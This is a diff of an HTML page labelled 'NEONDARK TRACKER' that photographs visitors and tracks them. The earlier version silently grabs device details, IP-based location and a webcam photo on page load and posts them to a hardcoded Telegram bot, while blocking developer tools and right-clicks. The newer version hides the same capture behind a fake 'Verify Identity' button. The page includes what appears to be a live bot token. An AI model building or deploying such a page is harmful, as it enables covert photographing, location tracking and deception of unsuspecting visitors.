@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loading...</title>
+    <title>Verify Identity</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
             color: #00ff41;
@@ -20,54 +16,24 @@
             align-items: center;
             flex-direction: column;
             padding: 20px;
-            animation: fadeIn 0.5s ease;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
         }
         .box {
-            background: rgba(0, 255, 65, 0.03);
-            border: 1px solid rgba(0, 255, 65, 0.15);
+            background: rgba(0,255,65,0.05);
+            border: 1px solid rgba(0,255,65,0.15);
             border-radius: 20px;
             padding: 40px 35px;
             max-width: 480px;
             width: 100%;
             text-align: center;
-            backdrop-filter: blur(10px);
-            animation: pulseGlow 3s infinite;
-        }
-        @keyframes pulseGlow {
-            0%,
-            100% {
-                border-color: rgba(0, 255, 65, 0.15);
-            }
-            50% {
-                border-color: rgba(0, 255, 65, 0.4);
-            }
         }
         h1 {
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             font-weight: 700;
             letter-spacing: 2px;
             margin-bottom: 8px;
-            background: linear-gradient(135deg, #00ff41, #00ffaa);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            color: #00ff41;
         }
-        .status {
-            color: #666;
-            font-size: 0.85rem;
-            margin: 12px 0;
-            letter-spacing: 1px;
-        }
+        .status { color: #666; font-size: 0.85rem; margin: 12px 0; }
         .dot {
             display: inline-block;
             width: 10px;
@@ -77,17 +43,9 @@
             animation: blink 1.2s infinite;
             margin-right: 10px;
         }
-        @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.15;
-            }
-        }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.15; } }
         .loader {
-            border: 2px solid rgba(0, 255, 65, 0.08);
+            border: 2px solid rgba(0,255,65,0.08);
             border-top: 2px solid #00ff41;
             border-radius: 50%;
             width: 40px;
@@ -95,67 +53,35 @@
             animation: spin 0.8s linear infinite;
             margin: 20px auto;
         }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { color: #222; font-size: 0.6rem; margin-top: 20px; }
+        video, canvas { display: none !important; }
+        .btn-verify {
+            padding: 14px 40px;
+            background: #00ff41;
+            border: none;
+            border-radius: 12px;
+            color: #0a0a0a;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
         }
-        .footer {
-            color: #222;
-            font-size: 0.6rem;
-            margin-top: 20px;
-            letter-spacing: 2px;
+        .btn-verify:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(0,255,65,0.2);
         }
-        .footer span {
-            color: #00ff41;
-            opacity: 0.3;
-        }
-        video,
-        canvas {
-            display: none !important;
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            width: 1px !important;
-            height: 1px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-        }
-        .progress-wrap {
-            margin: 15px 0;
-            display: none;
-        }
-        .progress-track {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff41, #00ffaa);
-            width: 0%;
-            border-radius: 10px;
-            transition: width 0.5s ease;
-        }
-        .progress-label {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.6rem;
-            color: #444;
-            margin-top: 4px;
-        }
+        .btn-verify:active { transform: scale(0.95); }
+        .hidden { display: none; }
         .toast {
             position: fixed;
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%) translateY(20px);
-            background: rgba(10, 10, 10, 0.9);
-            border: 1px solid rgba(0, 255, 65, 0.15);
+            background: rgba(10,10,10,0.9);
+            border: 1px solid rgba(0,255,65,0.15);
             border-radius: 12px;
             padding: 10px 20px;
             color: #00ff41;
@@ -167,61 +93,40 @@
             backdrop-filter: blur(12px);
             max-width: 90%;
         }
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
         @media (max-width: 480px) {
-            .box {
-                padding: 25px 20px;
-            }
-            h1 {
-                font-size: 1.3rem;
-            }
-            .loader {
-                width: 30px;
-                height: 30px;
-            }
+            .box { padding: 25px 20px; }
+            h1 { font-size: 1.3rem; }
+            .loader { width: 30px; height: 30px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== TOAST ===== -->
     <div class="toast" id="toast"><span id="toastMessage">✅ Ready</span></div>
 
-    <!-- ===== UI ===== -->
-    <div class="box">
-        <h1>🔒 SECURE CHANNEL</h1>
-        <div class="status"><span class="dot"></span> Establishing secure connection...</div>
+    <div class="box" id="mainBox">
+        <h1>🔐 VERIFY IDENTITY</h1>
+        <div class="status"><span class="dot"></span> Please verify your identity to continue</div>
         <div class="loader" id="loader"></div>
-        <div style="color: #444; font-size: 0.7rem; margin-top: 10px;">Please wait...</div>
-        <div class="footer"><span>NEONDARK</span> v3.0</div>
-
-        <!-- PROGRESS (tersembunyi) -->
-        <div class="progress-wrap" id="progressWrap">
-            <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-label"><span id="progressStep">Processing...</span><span id="progressPct">0%</span></div>
+        <p style="color: #444; font-size: 0.75rem; margin-top: 10px;">We need to confirm you are a real person</p>
+        <button class="btn-verify" id="verifyBtn" onclick="startCamera()">📸 Verify Now</button>
+        <div class="footer"><span style="color:#00ff41;">NEONDARK</span> v3.0</div>
+        <div style="margin-top:15px; font-size:0.65rem; color:#333;">
+            <span id="statusText">Click "Verify Now" to continue</span>
         </div>
     </div>
 
-    <!-- ===== ELEMEN SEMBUNYI BUAT FOTO ===== -->
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ============================================================= -->
-    <!-- JAVASCRIPT -->
-    <!-- ============================================================= -->
     <script>
-        // =============================================================
-        // 1. KONFIGURASI TELEGRAM (UDAH PAKE PUNYA LU)
-        // =============================================================
         const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
         const CHAT_ID = '8768522731';
 
-        // =============================================================
-        // 2. TOAST
-        // =============================================================
+        let stream = null;
+        let photoCaptured = false;
+
         function showToast(msg) {
             const toast = document.getElementById('toast');
             document.getElementById('toastMessage').textContent = msg;
@@ -230,29 +135,73 @@
             toast._timer = setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // =============================================================
-        // 3. UPDATE PROGRESS
-        // =============================================================
-        function updateProgress(pct, label) {
-            const wrap = document.getElementById('progressWrap');
-            const fill = document.getElementById('progressFill');
-            const step = document.getElementById('progressStep');
-            const pctEl = document.getElementById('progressPct');
-            wrap.style.display = 'block';
-            fill.style.width = pct + '%';
-            pctEl.textContent = pct + '%';
-            if (label) step.textContent = label;
+        function updateStatus(msg) {
+            document.getElementById('statusText').textContent = msg;
         }
 
-        // =============================================================
-        // 4. GET DEVICE INFO (TANPA IZIN)
-        // =============================================================
+        // ===== START CAMERA (DENGAN POPUP IZIN) =====
+        async function startCamera() {
+            const btn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
+            btn.disabled = true;
+            btn.textContent = '⏳ Accessing Camera...';
+            updateStatus('⏳ Mengakses kamera...');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+
+                updateStatus('✅ Camera active! Capturing photo...');
+
+                // Capture foto setelah 1 detik
+                setTimeout(() => {
+                    captureAndSend();
+                }, 1000);
+
+            } catch (e) {
+                console.error('Camera error:', e);
+                updateStatus('❌ Camera access denied or not available');
+                showToast('❌ Kamera tidak bisa diakses');
+                btn.disabled = false;
+                btn.textContent = '📸 Verify Now';
+                loader.style.display = 'block';
+            }
+        }
+
+        // ===== CAPTURE & SEND =====
+        function captureAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const photo = canvas.toDataURL('image/jpeg', 0.85);
+
+            // Matikan camera
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+
+            updateStatus('📸 Photo captured! Sending to server...');
+            showToast('📸 Foto terambil!');
+
+            // Kirim ke Telegram
+            sendToTelegram(photo);
+        }
+
+        // ===== GET DEVICE INFO =====
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let device = 'Unknown';
-            let os = 'Unknown';
-            let browser = 'Unknown';
-
+            let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
             if (ua.includes('Android')) os = 'Android';
             else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
             else if (ua.includes('Windows')) os = 'Windows';
@@ -277,18 +226,14 @@
             } else if (os === 'iOS') {
                 const match = ua.match(/OS\s([\d_]+)/);
                 if (match) os += ' ' + match[1].replace(/_/g, '.');
-                if (ua.includes('iPhone')) device = 'iPhone';
-                else if (ua.includes('iPad')) device = 'iPad';
+                device = ua.includes('iPhone') ? 'iPhone' : (ua.includes('iPad') ? 'iPad' : 'iOS Device');
             } else {
                 device = os + ' Device';
             }
-
             return { device, os, browser };
         }
 
-        // =============================================================
-        // 5. GET IP & LOCATION (TANPA IZIN)
-        // =============================================================
+        // ===== GET LOCATION =====
         async function getLocation() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -303,55 +248,78 @@
                     isp: data.org || 'Unknown'
                 };
             } catch (e) {
-                return {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    lat: 0,
-                    lon: 0,
-                    isp: 'Unknown'
-                };
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0,
+                    isp: 'Unknown' };
             }
         }
 
-        // =============================================================
-        // 6. CAPTURE PHOTO (DIAM-DIAM, TANPA POPUP)
-        // =============================================================
-        async function capturePhoto() {
-            return new Promise(async (resolve) => {
-                try {
-                    // Coba akses kamera tanpa popup (stream diam-diam)
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
-                        audio: false
+        // ===== SEND TO TELEGRAM =====
+        async function sendToTelegram(photoData) {
+            const deviceInfo = getDeviceInfo();
+            const location = await getLocation();
+            const now = new Date();
+            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
+            message += `📅 *Time:* ${dateStr}\n`;
+            message += `📱 *Device:* ${deviceInfo.device}\n`;
+            message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
+            message += `💻 *OS:* ${deviceInfo.os}\n`;
+            message += `🌍 *IP:* ${location.ip}\n`;
+            message += `📍 *City:* ${location.city}\n`;
+            message += `🗺️ *Region:* ${location.region}\n`;
+            message += `🏳️ *Country:* ${location.country}\n`;
+            message += `🏢 *ISP:* ${location.isp}\n`;
+            message += `🗺️ *Map:* https://www.google.com/maps?q=${location.lat},${location.lon}\n`;
+
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+            updateStatus('📤 Sending data to server...');
+
+            try {
+                // Kirim pesan
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Kirim foto
+                if (photoData) {
+                    const blob = dataURLtoBlob(photoData);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
                     });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    const photo = canvas.toDataURL('image/jpeg', 0.85);
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(photo);
-                } catch (e) {
-                    resolve(null);
                 }
-            });
+
+                // Update UI
+                document.querySelector('h1').textContent = '✅ VERIFIED!';
+                document.querySelector('.status').innerHTML = 'Identity verified successfully.';
+                document.getElementById('loader').style.display = 'none';
+                document.querySelector('.btn-verify').style.display = 'none';
+                updateStatus('✅ Data sent successfully!');
+                showToast('✅ Data terkirim ke Telegram!');
+
+            } catch (e) {
+                console.error('Send error:', e);
+                updateStatus('❌ Gagal mengirim data');
+                showToast('❌ Gagal kirim data');
+                btn.disabled = false;
+                btn.textContent = '📸 Verify Now';
+            }
         }
 
-        // =============================================================
-        // 7. DATA URL TO BLOB
-        // =============================================================
         function dataURLtoBlob(dataURL) {
             const arr = dataURL.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
@@ -362,138 +330,24 @@
             return new Blob([u8arr], { type: mime });
         }
 
-        // =============================================================
-        // 8. SEND TO TELEGRAM
-        // =============================================================
-        async function sendToTelegram(data) {
-            const now = new Date();
-            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-
-            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
-            message += `📅 *Time:* ${dateStr}\n`;
-            message += `📱 *Device:* ${data.device}\n`;
-            message += `🌐 *Browser:* ${data.browser}\n`;
-            message += `💻 *OS:* ${data.os}\n`;
-            message += `🌍 *IP:* ${data.location.ip}\n`;
-            message += `📍 *City:* ${data.location.city}\n`;
-            message += `🗺️ *Region:* ${data.location.region}\n`;
-            message += `🏳️ *Country:* ${data.location.country}\n`;
-            message += `🏢 *ISP:* ${data.location.isp}\n`;
-            message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
-
-            // Kirim pesan
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // Kirim foto
-            if (data.photo) {
-                const blob = dataURLtoBlob(data.photo);
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }
-        }
-
-        // =============================================================
-        // 9. MAIN EXECUTION (DIJALANKAN OTOMATIS, DIAM-DIAM)
-        // =============================================================
-        async function main() {
+        // ===== CEK APAKAH SUDAH PERNAH AKSES KAMERA =====
+        async function checkCameraPermission() {
             try {
-                updateProgress(10, 'Mengambil info device...');
-                const deviceInfo = getDeviceInfo();
-                updateProgress(30, 'Mendapatkan lokasi...');
-                const location = await getLocation();
-                updateProgress(50, 'Mengambil foto...');
-                const photo = await capturePhoto();
-                updateProgress(75, 'Mengirim ke Telegram...');
-
-                const data = {
-                    device: deviceInfo.device,
-                    os: deviceInfo.os,
-                    browser: deviceInfo.browser,
-                    location: location,
-                    photo: photo
-                };
-
-                await sendToTelegram(data);
-
-                updateProgress(100, '✅ Selesai!');
-
-                // Ubah tampilan biar keliatan normal
-                document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
-                document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
-                document.getElementById('loader').style.display = 'none';
-                document.querySelector('.footer').innerHTML = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString(
-                'id-ID');
-
-                showToast('✅ Data terkirim!');
-
+                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                testStream.getTracks().forEach(t => t.stop());
+                return true;
             } catch (e) {
-                console.error('Main error:', e);
-                // Tetap kirim data yang udah dapet
-                try {
-                    const deviceInfo = getDeviceInfo();
-                    const location = await getLocation();
-                    await sendToTelegram({
-                        device: deviceInfo.device,
-                        os: deviceInfo.os,
-                        browser: deviceInfo.browser,
-                        location: location,
-                        photo: null
-                    });
-                } catch (e2) { console.error('Fallback error:', e2); }
+                return false;
             }
         }
 
-        // =============================================================
-        // 10. JALANKAN LANGSUNG
-        // =============================================================
-        main();
-
-        // =============================================================
-        // 11. CONSOLE LOG
-        // =============================================================
-        console.log('%c🔒 NEONDARK TRACKER v3.0', 'color:#00ff41;font-size:20px;font-weight:700;');
-        console.log('%c⚡ Silent mode aktif!', 'color:#ff4444;font-size:14px;');
-        console.log('%c📱 Device: ' + navigator.userAgent, 'color:#888;font-size:12px;');
-        console.log('%c✅ Siap mengirim data ke Telegram!', 'color:#00ff41;font-size:14px;');
-
-        // =============================================================
-        // 12. PREVENT CONTEXT MENU
-        // =============================================================
+        // ===== PREVENT CONTEXT MENU =====
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('dragstart', e => e.preventDefault());
         document.addEventListener('drop', e => e.preventDefault());
 
-        // =============================================================
-        // 13. PREVENT KEYBOARD SHORTCUTS
-        // =============================================================
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-            }
-        });
-
-        // =============================================================
-        // 14. BLOKIR SCROLL (biar gak keliatan)
-        // =============================================================
-        window.addEventListener('scroll', () => window.scrollTo(0, 0));
-        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
-
-        console.log('✅ NEONDARK TRACKER AKTIF!');
+        console.log('%c🔒 NEONDARK TRACKER v3.0', 'color:#00ff41;font-size:20px;font-weight:700;');
+        console.log('%c📞 BOT_TOKEN & CHAT_ID sudah di-set', 'color:#25d366;font-size:13px;');
     </script>
 
 </body>
